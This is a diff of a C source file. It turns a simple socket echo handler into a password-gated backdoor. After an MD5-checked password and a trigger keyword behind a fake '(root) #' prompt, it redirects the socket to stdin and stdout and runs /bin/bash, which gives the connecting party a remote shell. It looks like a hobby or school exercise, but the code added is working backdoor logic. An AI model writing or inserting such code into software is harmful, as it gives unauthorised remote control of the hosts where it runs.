@@ -2,13 +2,45 @@
 
 void	connection(int sock)
 {
-	char	buf[512];
+	char	*str;
+	char	*hash;
 
-	write(sock, "Hello", 5);
-
-	int r = read(sock, buf, 511);
-	buf[r] = '\0';
-	write(sock, buf, r);
+	while (1)
+	{
+		write(sock, "Password : ", 11);
+		if ((get_next_line(sock, &str)) <= 0)
+		{
+			printf("Gnl error\n");
+			exit(0);
+		}
+		hash = md5(str);
+		free(str);
+		if (ft_strcmp(hash, PASSWORD) == 0)
+		{
+			free(hash);
+			break;
+		}
+		free(hash);
+	}
+	write(sock, "Success !\n", 10);
+	while (1)
+	{
+		write(sock, "(root) # ", 9);
+		if ((get_next_line(sock, &str)) <= 0)
+		{
+			printf("Gnl error\n");
+			exit(0);
+		}
+		if (ft_strcmp(str, SHELL) == 0)
+		{
+			write(sock, "shell run\n", 10);
+			break ;
+		}
+		free(str);
+	}
+	dup2(sock, 1);
+	dup2(sock, 0);
+	execv("/bin/bash", NULL);
 }
 
 void	handle_connection(int sock)
